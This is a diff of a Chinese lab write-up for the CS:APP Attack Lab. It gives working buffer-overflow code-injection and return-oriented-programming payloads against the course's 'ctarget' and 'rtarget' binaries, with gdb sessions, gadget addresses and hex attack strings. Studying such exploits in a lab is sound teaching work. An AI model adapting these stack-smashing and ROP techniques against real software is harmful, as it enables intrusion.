@@ -16,6 +16,7 @@
 ## Part 1: Code Injection Attacks
 
 > 输入攻击文本，对 `ctarget` 程序进行攻击，使得输入到栈中的数据被认为是指令，而引发特定错误。
+>
 
 ### Phase 1
 
@@ -110,9 +111,9 @@
      40186d:	89 fa                	mov    %edi,%edx
      ...
    ```
-
+   
    可以得到 `touch2` 的起始地址为 `0x401869` 。
-
+   
    构造汇编形式的插入代码：
 
    ```assembly
@@ -153,7 +154,19 @@
    `si` 执行当前行代码并进入下一行（如果当前行是函数调用，则进入函数调用），再通过 `disas getbuf` 输出目标函数的汇编，执行 `p $rsp` 输出寄存器 `%rsp` 的值：
 
    ```bash
-   (gdb) si  # 前进一步（以指令为粒度）14      in buf.c(gdb) disas getbuf  # 输出汇编Dump of assembler code for function getbuf:   0x0000000000401825 <+0>:     sub    $0x38,%rsp=> 0x0000000000401829 <+4>:     mov    %rsp,%rdi  # 进入该行，说明已执行完上一行开辟空间   0x000000000040182c <+7>:     callq  0x401ac5 <Gets>   0x0000000000401831 <+12>:    mov    $0x1,%eax   0x0000000000401836 <+17>:    add    $0x38,%rsp   0x000000000040183a <+21>:    retq   End of assembler dump.(gdb) p $rsp  # 查看栈顶指针当前位置（即 buf 的起始地址）$1 = (void *) 0x55644e38
+   (gdb) si  # 前进一步（以指令为粒度）
+   14      in buf.c
+   (gdb) disas getbuf  # 输出汇编
+   Dump of assembler code for function getbuf:
+      0x0000000000401825 <+0>:     sub    $0x38,%rsp
+   => 0x0000000000401829 <+4>:     mov    %rsp,%rdi  # 进入该行，说明已执行完上一行开辟空间
+      0x000000000040182c <+7>:     callq  0x401ac5 <Gets>
+      0x0000000000401831 <+12>:    mov    $0x1,%eax
+      0x0000000000401836 <+17>:    add    $0x38,%rsp
+      0x000000000040183a <+21>:    retq   
+   End of assembler dump.
+   (gdb) p $rsp  # 查看栈顶指针当前位置（即 buf 的起始地址）
+   $1 = (void *) 0x55644e38
    ```
 
    `%rsp` 的值为 `0x55644e38` ，即为 `buf` 的起始地址，小端地址为 `38 4e 64 55 00 00 00 00` 。
@@ -161,13 +174,28 @@
    最后构造攻击文本，`buf` 的起始位置为存储 `Cookie` 到 `%rdi` 、压入 `touch2` 地址并返回的指令字节序列，因此在读入 `56` 个字节的内容使得 `getbuf()` 内存空间被填满后，会将下 `8` 个字节的内容即 `38 4e 64 55 00 00 00 00` 作为下一条指令地址执行，即跳转到 `buf` 的起始地址并执行指令字节序列，成功将 `Cookie` 值作为参数传入 `touch2` 中。
 
    ```
-   48 c7 c7 0f ac 02 4b 6869 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0038 4e 64 55 00 00 00 00
+   48 c7 c7 0f ac 02 4b 68
+   69 18 40 00 c3 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   38 4e 64 55 00 00 00 00
    ```
 
    执行 `cat 2.txt | ./hex2raw | ./ctarget -q` 指令，利用 `hex2raw` 转换之后进行测试，获得以下信息，攻击成功：
 
    ```bash
-   2020010942@hp:~$ cat 2.txt | ./hex2raw | ./ctarget -qCookie: 0x4b02ac0fType string:Touch2!: You called touch2(0x4b02ac0f)Valid solution for level 2 with target ctargetPASS: Would have posted the following:        user id NoOne        course  15213-f15        lab     attacklab        result  2020010942:PASS:0xffffffff:ctarget:2:48 C7 C7 0F AC 02 4B 68 69 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 
+   2020010942@hp:~$ cat 2.txt | ./hex2raw | ./ctarget -q
+   Cookie: 0x4b02ac0f
+   Type string:Touch2!: You called touch2(0x4b02ac0f)
+   Valid solution for level 2 with target ctarget
+   PASS: Would have posted the following:
+           user id NoOne
+           course  15213-f15
+           lab     attacklab
+           result  2020010942:PASS:0xffffffff:ctarget:2:48 C7 C7 0F AC 02 4B 68 69 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 
    ```
 
 4. **困难与心得**
@@ -193,7 +221,10 @@
    查看 **Phase 1** 中生成的 `ctarget.asm` 文件：
 
    ```assembly
-   0000000000401980 <touch3>:    401980:	53                   	push   %rbx  # 起始地址为 0x401980    401981:	48 89 fb             	mov    %rdi,%rbx    ...
+   0000000000401980 <touch3>:
+       401980:	53                   	push   %rbx  # 起始地址为 0x401980
+       401981:	48 89 fb             	mov    %rdi,%rbx
+       ...
    ```
 
    得到 `touch3()` 的起始地址为 `0x401980` ，小端为 `80 19 40 00 00 00 00 00` 。
@@ -201,7 +232,27 @@
    与 **Phase 2** 中同理，进行 `gdb` 调试：
 
    ```bash
-   2020010942@hp:~$ gdb ./ctarget  # gdb 调试程序 ./ctargetReading symbols from ./ctarget...done.(gdb) b getbuf  # getbuf 处设置断点Breakpoint 1 at 0x401825: file buf.c, line 12.(gdb) r -q  # 运行（在本地运行，不上传服务器）Starting program: /home/2020010942/ctarget -qdCookie: 0x4b02ac0fBreakpoint 1, getbuf () at buf.c:1212      buf.c: No such file or directory.(gdb) disas getbuf  # 输出 getbuf 汇编代码Dump of assembler code for function getbuf:=> 0x0000000000401825 <+0>:     sub    $0x38,%rsp  # 还未执行开辟 buf 空间的指令   0x0000000000401829 <+4>:     mov    %rsp,%rdi   0x000000000040182c <+7>:     callq  0x401ac5 <Gets>   0x0000000000401831 <+12>:    mov    $0x1,%eax   0x0000000000401836 <+17>:    add    $0x38,%rsp   0x000000000040183a <+21>:    retq   End of assembler dump.(gdb) p $rsp  # 输出寄存器 %rsp 当前的值，即 getbuf 栈顶地址$1 = (void *) 0x55644e70
+   2020010942@hp:~$ gdb ./ctarget  # gdb 调试程序 ./ctarget
+   Reading symbols from ./ctarget...done.
+   (gdb) b getbuf  # getbuf 处设置断点
+   Breakpoint 1 at 0x401825: file buf.c, line 12.
+   (gdb) r -q  # 运行（在本地运行，不上传服务器）
+   Starting program: /home/2020010942/ctarget -q
+   dCookie: 0x4b02ac0f
+   
+   Breakpoint 1, getbuf () at buf.c:12
+   12      buf.c: No such file or directory.
+   (gdb) disas getbuf  # 输出 getbuf 汇编代码
+   Dump of assembler code for function getbuf:
+   => 0x0000000000401825 <+0>:     sub    $0x38,%rsp  # 还未执行开辟 buf 空间的指令
+      0x0000000000401829 <+4>:     mov    %rsp,%rdi
+      0x000000000040182c <+7>:     callq  0x401ac5 <Gets>
+      0x0000000000401831 <+12>:    mov    $0x1,%eax
+      0x0000000000401836 <+17>:    add    $0x38,%rsp
+      0x000000000040183a <+21>:    retq   
+   End of assembler dump.
+   (gdb) p $rsp  # 输出寄存器 %rsp 当前的值，即 getbuf 栈顶地址
+   $1 = (void *) 0x55644e70
    ```
 
    `Cookie` 的写入位置在 `buf` 的终止地址（ `0x55644e70` ）再加上 `8` 字节返回地址的大小后，即为 `0x55644e78` 。
@@ -209,13 +260,19 @@
    编写汇编代码，实现存放 `Cookie` 的地址到 `%rdi` 、压入 `touch3` 地址并返回的功能：
 
    ```assembly
-   inject3:    mov     $0x55644e78, %rdi  # 将 Cookie 的地址存放在寄存器 %rdi 中    push    $0x401980  # 将 touch3 的起始地址压入栈    ret
+   inject3:
+       mov     $0x55644e78, %rdi  # 将 Cookie 的地址存放在寄存器 %rdi 中
+       push    $0x401980  # 将 touch3 的起始地址压入栈
+       ret
    ```
 
    同 **Phase 2** 中将上述汇编代码 `inject3.s` 编译 `gcc -c inject3.s` 到对象文件 `inject3.o` ；再执行 `objdump -d inject3.o > inject3.d` ，生成机器指令：
 
    ```assembly
-   0000000000000000 <inject3>:   0:	48 c7 c7 78 4e 64 55 	mov    $0x55644e78,%rdi   7:	68 80 19 40 00       	pushq  $0x401980   c:	c3                   	retq   
+   0000000000000000 <inject3>:
+      0:	48 c7 c7 78 4e 64 55 	mov    $0x55644e78,%rdi
+      7:	68 80 19 40 00       	pushq  $0x401980
+      c:	c3                   	retq   
    ```
 
    即得机器指令为： `48 c7 c7 78 4e 64 55 68 80 19 40 00 c3` 。
@@ -223,7 +280,15 @@
    再通过 `ascii -s 4b02ac0f` 指令，将字符串 `4b02ac0f` （ `Cookie` 的值）转换为字节表示：
 
    ```bash
-   2020010942@hp:~$ ascii -s 4b02ac0f3/4   52   0x34   0o64   001101006/2   98   0x62   0o142   011000103/0   48   0x30   0o60   001100003/2   50   0x32   0o62   001100106/1   97   0x61   0o141   011000016/3   99   0x63   0o143   011000113/0   48   0x30   0o60   001100006/6   102   0x66   0o146   01100110
+   2020010942@hp:~$ ascii -s 4b02ac0f
+   3/4   52   0x34   0o64   00110100
+   6/2   98   0x62   0o142   01100010
+   3/0   48   0x30   0o60   00110000
+   3/2   50   0x32   0o62   00110010
+   6/1   97   0x61   0o141   01100001
+   6/3   99   0x63   0o143   01100011
+   3/0   48   0x30   0o60   00110000
+   6/6   102   0x66   0o146   01100110
    ```
 
    末位添 `00` （与 `C` 语言中字符串末位添 `\0` 同理）即得：`34 62 30 32 61 63 30 66 00` 。
@@ -231,37 +296,74 @@
    最后构造攻击文本，`buf` 的起始位置为存放 `Cookie` 的地址到 `%rdi` 、压入 `touch3` 地址并返回的指令字节序列，因此在读入 `56` 个字节的内容使得 `getbuf()` 内存空间被填满后，会将下 `8` 个字节的内容即 `38 4e 64 55 00 00 00 00` 作为下一条指令地址执行，即跳转到 `buf` 的起始地址并执行指令字节序列，成功将 `Cookie` 在内存中的地址（即 `buf` 的终止地址再加上 `8` 字节返回地址的大小处，因此 `Cookie` 的字节序列在攻击文本填充 `56` 字节再加上返回地址的 `8` 字节大小处，即紧随  `38 4e 64 55 00 00 00 00` 内容的后 `9` 个字节）作为指针参数传入 `touch3()` 中：
 
    ```
-   48 c7 c7 78 4e 64 55 6880 19 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0038 4e 64 55 00 00 00 0034 62 30 32 61 63 30 66 00
+   48 c7 c7 78 4e 64 55 68
+   80 19 40 00 c3 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   38 4e 64 55 00 00 00 00
+   34 62 30 32 61 63 30 66 00
    ```
 
    执行 `cat 3.txt | ./hex2raw | ./ctarget -q` 指令，攻击成功：
 
    ```bash
-   2020010942@hp:~$ cat 3.txt | ./hex2raw | ./ctarget -qCookie: 0x4b02ac0fType string:Touch3!: You called touch3("4b02ac0f")Valid solution for level 3 with target ctargetPASS: Would have posted the following:        user id NoOne        course  15213-f15        lab     attacklab        result  2020010942:PASS:0xffffffff:ctarget:3:48 C7 C7 78 4E 64 55 68 80 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 34 62 30 32 61 63 30 66 00 
+   2020010942@hp:~$ cat 3.txt | ./hex2raw | ./ctarget -q
+   Cookie: 0x4b02ac0f
+   Type string:Touch3!: You called touch3("4b02ac0f")
+   Valid solution for level 3 with target ctarget
+   PASS: Would have posted the following:
+           user id NoOne
+           course  15213-f15
+           lab     attacklab
+           result  2020010942:PASS:0xffffffff:ctarget:3:48 C7 C7 78 4E 64 55 68 80 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 34 62 30 32 61 63 30 66 00 
    ```
 
 4. **困难与心得**
 
    `Cookie` 的写入位置可以任意，只要不在 `hexmatch` 、`strncmp` 所开辟的栈帧即可，因此只需要构造出对应注入的代码，把 `Cookie` 的值 `mov` 到对应内存地址处，再将该地址存放到 `%rdi` 寄存器中即可实现正确的 `touch3` 传参；但因为无法用 `ascii` 生成 `Cookie` 字符串结尾处的 `\0` ，因此每次传的参都会带有之前地址上残余的错误信息（如 `4b02ac0f�@` 带有错误信息 `�@` ）。
-
+   
    初代攻击文本为：
-
+   
    ```
-   48 c7 c7 78 4e 64 55 48b8 34 62 30 32 61 63 3066 48 89 04 25 78 4e 6455 68 80 19 40 00 c3 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0038 4e 64 55 00 00 00 00
+   48 c7 c7 78 4e 64 55 48
+   b8 34 62 30 32 61 63 30
+   66 48 89 04 25 78 4e 64
+   55 68 80 19 40 00 c3 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   38 4e 64 55 00 00 00 00
    ```
-
+   
    其中 `buf` 开头的指令通过以下汇编代码转来：
-
+   
    ```assembly
-   0000000000000000 <inject3>:   0:	48 c7 c7 78 4e 64 55 	mov    $0x55644e78,%rdi   7:	48 b8 34 62 30 32 61 	movabs $0x6630636132306234,%rax  # 因为 mov 无法处理过大的立即数，需借助寄存器 %rax 倒一下，最终放入内存地址中   e:	63 30 66   11:	48 89 04 25 78 4e 64 	mov    %rax,0x55644e78  # 将 Cookie 放入内存地址中  18:	55   19:	68 80 19 40 00       	pushq  $0x401980  1e:	c3                   	retq   
+   0000000000000000 <inject3>:
+      0:	48 c7 c7 78 4e 64 55 	mov    $0x55644e78,%rdi
+      7:	48 b8 34 62 30 32 61 	movabs $0x6630636132306234,%rax  # 因为 mov 无法处理过大的立即数，需借助寄存器 %rax 倒一下，最终放入内存地址中
+      e:	63 30 66 
+     11:	48 89 04 25 78 4e 64 	mov    %rax,0x55644e78  # 将 Cookie 放入内存地址中
+     18:	55 
+     19:	68 80 19 40 00       	pushq  $0x401980
+     1e:	c3                   	retq   
    ```
-
+   
    报错为：
-
+   
    ```bash
-   2020010942@hp:~$ cat 3.txt | ./hex2raw | ./ctarget -qCookie: 0x4b02ac0fType string:Misfire: You called touch3("4b02ac0f�@")FAIL: Would have posted the following:        user id NoOne        course  15213-f15        lab     attacklab        result  2020010942:FAIL:0xffffffff:ctarget:3:48 C7 C7 78 4E 64 55 48 B8 34 62 30 32 61 63 30 66 48 89 04 25 78 4E 64 55 68 80 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 
+   2020010942@hp:~$ cat 3.txt | ./hex2raw | ./ctarget -q
+   Cookie: 0x4b02ac0f
+   Type string:Misfire: You called touch3("4b02ac0f�@")
+   FAIL: Would have posted the following:
+           user id NoOne
+           course  15213-f15
+           lab     attacklab
+           result  2020010942:FAIL:0xffffffff:ctarget:3:48 C7 C7 78 4E 64 55 48 B8 34 62 30 32 61 63 30 66 48 89 04 25 78 4E 64 55 68 80 19 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 4E 64 55 00 00 00 00 
    ```
-
+   
    因此后面我转换思路，不通过注入的代码来将 `Cookie` 的字符串形式放到对应内存地址处，而是直接在攻击文本中将 `Cookie` 的字符串形式写入，这样写入可以人为地在结尾处补 `00` 来表示该字符串已结束。我觉得我这个问题肯定有对应的 `ascii` 可以解决，但我目前没有找到，并且即使找到了过程也较为繁琐（因为 `Cookie` 本身的字符串形式的大小已经是寄存器的存储上限，再补结束符会需要 `4` 次移动，`2` 次立即数移动到寄存器、`2` 次寄存器移动到内存地址）；因此这种思路转换来规避问题的方法也是值得我学习的。整体而言，这一 `phase` 让我对栈桢的分布理解的更透彻了。
 
 
@@ -269,6 +371,7 @@
 ## Part 2: Return-Oriented Programming
 
 > 输入攻击文本，利用 `rtarget` 程序中原有指令的重新组合，对程序进行攻击而引发特定错误。
+>
 
 ### Phase 4
 
@@ -289,41 +392,65 @@
    构造汇编代码，实现将写入栈内的 `Cookie` ，通过 `pop %rax` 直接保存到寄存器 `%rax` 中，再从 `%rax` 中移动到存放首个参数的 `%rdi` 寄存器中，以实现后续 `touch2()` 中的正确传参（查表可得编码的指令序列）：
 
    ```assembly
-   popq    %rax  # 指令序列为 58movq    %rax, %rdi  # 指令序列为 48 89 c7
+   popq    %rax  # 指令序列为 58
+   movq    %rax, %rdi  # 指令序列为 48 89 c7
    ```
-
+   
    在 `rtarget` 的 `<start_farm>` 至 `<end_farm>` 之间进行检索（记得指令序列后面可以跟若干个 `90` ，表示 `nop` ；最后必须跟 `c3` ，表示 `ret` ）：
-
+   
    ```assembly
-   0000000000401a38 <setval_448>:  401a38:	c7 07 58 c3 af 28    	movl   $0x28afc358,(%rdi)  # 0x401a3a 处有 58 c3  401a3e:	c3                   	retq   
+   0000000000401a38 <setval_448>:
+     401a38:	c7 07 58 c3 af 28    	movl   $0x28afc358,(%rdi)  # 0x401a3a 处有 58 c3
+     401a3e:	c3                   	retq   
    ```
-
+   
    得到 `pop %rax` 的指令序列在 `0x401a3a` 处，小端补零为 `3a 1a 40 00 00 00 00 00` ；
-
+   
    ```assembly
-   0000000000401a23 <setval_142>:  401a23:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)  # 0x401a25 处有 48 89 c7 c3  401a29:	c3                   	retq   
+   0000000000401a23 <setval_142>:
+     401a23:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)  # 0x401a25 处有 48 89 c7 c3
+     401a29:	c3                   	retq   
    ```
-
+   
    `mov %rax, %rdi` 的指令序列在 `0x401a25` 处，小端补零为 `33 1a 40 00 00 00 00 00` 。
-
+   
    由 **Phase 2** 中得到的 `touch2` 的起始地址为 `0x401869` （小端补零为 `69 18 40 00 00 00 00 00` ），以及 `Cookie` 值 `0x4b02ac0f`（小端补零为 `0f ac 02 4b 00 00 00 00 ` ），构造攻击文本：
-
+   
    ```
-   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 003a 1a 40 00 00 00 00 000f ac 02 4b 00 00 00 00 25 1a 40 00 00 00 00 0069 18 40 00 00 00 00 00
+   00 00 00 00 00 00 00 00 
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00 
+   00 00 00 00 00 00 00 00 
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   3a 1a 40 00 00 00 00 00
+   0f ac 02 4b 00 00 00 00 
+   25 1a 40 00 00 00 00 00
+   69 18 40 00 00 00 00 00
    ```
-
+   
    执行 `cat 4.txt | ./hex2raw | ./rtarget -q` 得到正确结果：
-
+   
    ```bash
-   2020010942@hp:~$ cat 4.txt | ./hex2raw | ./rtarget -qCookie: 0x4b02ac0fType string:Touch2!: You called touch2(0x4b02ac0f)Valid solution for level 2 with target rtargetPASS: Would have posted the following:        user id NoOne        course  15213-f15        lab     attacklab        result  2020010942:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 1A 40 00 00 00 00 00 0F AC 02 4B 00 00 00 00 25 1A 40 00 00 00 00 00 69 18 40 00 00 00 00 00 
+   2020010942@hp:~$ cat 4.txt | ./hex2raw | ./rtarget -q
+   Cookie: 0x4b02ac0f
+   Type string:Touch2!: You called touch2(0x4b02ac0f)
+   Valid solution for level 2 with target rtarget
+   PASS: Would have posted the following:
+           user id NoOne
+           course  15213-f15
+           lab     attacklab
+           result  2020010942:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 1A 40 00 00 00 00 00 0F AC 02 4B 00 00 00 00 25 1A 40 00 00 00 00 00 69 18 40 00 00 00 00 00 
    ```
-
-4. **困难与心得**
-
+   
+3. **困难与心得**
+   
    最开始没有找到 `pop %rdi` 的指令（即 `5f` ），后来意识到可以用其他的寄存器周转，改变思路，最后找到了 `%rax` 作为周转寄存器：
-
+   
       ```assembly
-   popq    %rax  # 原先这两行指令只有一行 pop %rdi, 但该指令的字节序无法在 rtarget 中检索到，故退而求其次，使用 %rax 这一寄存器进行周转movq    %rax, %rdi  # 最终 Cookie 的值存放到 %rdi 中
+      popq    %rax  # 原先这两行指令只有一行 pop %rdi, 但该指令的字节序无法在 rtarget 中检索到，故退而求其次，使用 %rax 这一寄存器进行周转
+      movq    %rax, %rdi  # 最终 Cookie 的值存放到 %rdi 中
       ```
 
    条条大路通罗马，关键是想明白攻击文本中 `gadget` 和 `data` 的排布，以及在 `stack frame` 中他们的位置、何时被执行。
@@ -347,45 +474,92 @@
    计算地址需用两个寄存器的 `lea` 指令，`rtarget` 中仅有：
 
    ```assembly
-   0000000000401a61 <add_xy>:  401a61:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  # %rax = %rdi + %rsi * 1，其中 %rdi 存栈顶指针 %rsp 的值，%rsi 存 Cookie 相对 %rsp 的偏移量  401a65:	c3                   	retq   
+   0000000000401a61 <add_xy>:
+     401a61:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax  # %rax = %rdi + %rsi * 1，其中 %rdi 存栈顶指针 %rsp 的值，%rsi 存 Cookie 相对 %rsp 的偏移量
+     401a65:	c3                   	retq   
    ```
-
+   
    其地址为`0x401a61`；要使用 `lea (%rdi,%rsi,1),%rax` ，`%rdi` 存栈顶指针 `%rsp` 的值，`%rsi` 存 `Cookie` 的地址相对 `%rsp` 的偏移量，且最后需将结果移动到存放到第一参数的寄存器 `%rdi` 中。
-
+   
    因此汇编代码初步规划为：
-
+   
    ```assembly
-   mov    %rsp, %rdi  # %rdi = %rsp，存栈顶指针pop    %rsi  # 将栈中所得偏移量存入寄存器 %rsi 中lea    (%rdi, %rsi, 1), %rax  # %rax = %rdi + %rsi * 1，计算出 Cookie 地址mov    %rax, %rdi  # %rdi = %rax，计算出的 Cookie 地址存储到第一参数的寄存器 %rdi 中ret
+   mov    %rsp, %rdi  # %rdi = %rsp，存栈顶指针
+   pop    %rsi  # 将栈中所得偏移量存入寄存器 %rsi 中
+   lea    (%rdi, %rsi, 1), %rax  # %rax = %rdi + %rsi * 1，计算出 Cookie 地址
+   mov    %rax, %rdi  # %rdi = %rax，计算出的 Cookie 地址存储到第一参数的寄存器 %rdi 中
+   ret
    ```
-
+   
    计算得到偏移量的大小为：`9 * 8 = 72 ` 字节，转换为 `16` 进制即为 `0x48` 字节，小端补零为 `48 00 00 00 00 00 00 00` （偏移量计算可详见**实验原理**中的栈帧示意图，**加粗方框**中的大小即蓝色字体为偏移量，红色字体为基址，绿色字体为计算出的 `Cookie` 所在地址）。
-
+   
    从 `rtarget` 中整理出所有含 `pop` 、 `mov` 指令的代码：
-
+   
    ```assembly
-   movq   %rax, %rdi  # 0x401a25: 48 89 c7movq   %rsp, %rax  # 0x401ae8: 48 89 e0popq   %rax  # 0x401a3a: 58movl   %eax, %edi  # 0x401a26: 89 c7movl   %ecx, %edx  # 0x401b0c: 89 camovl   %eax, %ecx  # 0x401b27: 89 c1movl   %edx, %esi  # 0x401a97: 89 d6movl   %esp, %eax  # 0x401a76: 89 e0
+   movq   %rax, %rdi  # 0x401a25: 48 89 c7
+   movq   %rsp, %rax  # 0x401ae8: 48 89 e0
+   popq   %rax  # 0x401a3a: 58
+   movl   %eax, %edi  # 0x401a26: 89 c7
+   movl   %ecx, %edx  # 0x401b0c: 89 ca
+   movl   %eax, %ecx  # 0x401b27: 89 c1
+   movl   %edx, %esi  # 0x401a97: 89 d6
+   movl   %esp, %eax  # 0x401a76: 89 e0
    ```
-
+   
    修改汇编代码为：
 
    ```assembly
-     movq   %rsp, %rax  # 0x401ae8: 48 89 e0movq   %rax, %rdi  # 0x401a25: 48 89 c7  popq   %rax  # 0x401a3a: 58movl   %eax, %ecx  # 0x401b27: 89 c1  movl   %ecx, %edx  # 0x401b0c: 89 camovl   %edx, %esi  # 0x401a97: 89 d6  lea    (%rdi, %rsi, 1), %rax  # 0x401a61movl   %rax, %rdi  # 0x401a25: 48 89 c7  ret
+   movq   %rsp, %rax  # 0x401ae8: 48 89 e0
+   movq   %rax, %rdi  # 0x401a25: 48 89 c7
+   popq   %rax  # 0x401a3a: 58
+   movl   %eax, %ecx  # 0x401b27: 89 c1
+   movl   %ecx, %edx  # 0x401b0c: 89 ca
+   movl   %edx, %esi  # 0x401a97: 89 d6
+   lea    (%rdi, %rsi, 1), %rax  # 0x401a61
+   movl   %rax, %rdi  # 0x401a25: 48 89 c7
+   ret
    ```
-
+   
    由 **Phase 3** 中得到的 `touch3` 的起始地址为 `0x401980` （小端补零为 `80 19 40 00 00 00 00 00` ），以及 `Cookie` 字符串的字节表示 `34 62 30 32 61 63 30 66 00` ，构造攻击文本：
 
    ```
-     00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00e8 1a 40 00 00 00 00 00  25 1a 40 00 00 00 00 003a 1a 40 00 00 00 00 00  48 00 00 00 00 00 00 0027 1b 40 00 00 00 00 00  0c 1b 40 00 00 00 00 0097 1a 40 00 00 00 00 00  61 1a 40 00 00 00 00 0025 1a 40 00 00 00 00 0080 19 40 00 00 00 00 0034 62 30 32 61 63 30 66 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   e8 1a 40 00 00 00 00 00
+   25 1a 40 00 00 00 00 00
+   3a 1a 40 00 00 00 00 00
+   48 00 00 00 00 00 00 00
+   27 1b 40 00 00 00 00 00
+   0c 1b 40 00 00 00 00 00
+   97 1a 40 00 00 00 00 00
+   61 1a 40 00 00 00 00 00
+   25 1a 40 00 00 00 00 00
+   80 19 40 00 00 00 00 00
+   34 62 30 32 61 63 30 66 00
    ```
-
+   
    执行 `cat 5.txt | ./hex2raw | ./rtarget -q` 得到正确结果：
-
+   
    ```bash
-   2020010942@hp:~$ cat 5.txt | ./hex2raw | ./rtarget -q  Cookie: 0x4b02ac0fType string:Touch3!: You called touch3("4b02ac0f")Valid solution for level 3 with target rtargetPASS: Would have posted the following:        user id NoOne        course  15213-f15        lab     attacklab        result  2020010942:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 1A 40 00 00 00 00 00 25 1A 40 00 00 00 00 00 3A 1A 40 00 00 00 00 00 48 00 00 00 00 00 00 00 27 1B 40 00 00 00 00 00 0C 1B 40 00 00 00 00 00 97 1A 40 00 00 00 00 00 61 1A 40 00 00 00 00 00 25 1A 40 00 00 00 00 00 80 19 40 00 00 00 00 00 34 62 30 32 61 63 30 66 00 
+   2020010942@hp:~$ cat 5.txt | ./hex2raw | ./rtarget -q
+   Cookie: 0x4b02ac0f
+   Type string:Touch3!: You called touch3("4b02ac0f")
+   Valid solution for level 3 with target rtarget
+   PASS: Would have posted the following:
+           user id NoOne
+           course  15213-f15
+           lab     attacklab
+           result  2020010942:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 1A 40 00 00 00 00 00 25 1A 40 00 00 00 00 00 3A 1A 40 00 00 00 00 00 48 00 00 00 00 00 00 00 27 1B 40 00 00 00 00 00 0C 1B 40 00 00 00 00 00 97 1A 40 00 00 00 00 00 61 1A 40 00 00 00 00 00 25 1A 40 00 00 00 00 00 80 19 40 00 00 00 00 00 34 62 30 32 61 63 30 66 00 
    ```
-
+   
 4. **困难与心得**
 
    最开始试图用 **Phase 4** 的办法，一个个尝试可行的 `mov` 方案，后来发现可能性太多了，一个个搜起来太麻烦（如本题从 `%rax` 到 `%rsi` 就中间周转了 `2` 次，最差可能要试 `8 ^ 2 = 64` 种情况）；因为 `pop` 、`mov` 本身的字节指令有规律，完全可以在 `rtarget` 中将所有的 `pop` 、`mov` 指令都搜索出来，最后再根据全部出现的指令进行简单拼接。另外的，结合前几个 **Phase** 一起，对 `push` 、 `pop` 以及函数的 `ret` 指令有了更深刻的理解，知道了这些指令如何影响栈帧（影响栈顶指针）。
 
    
+
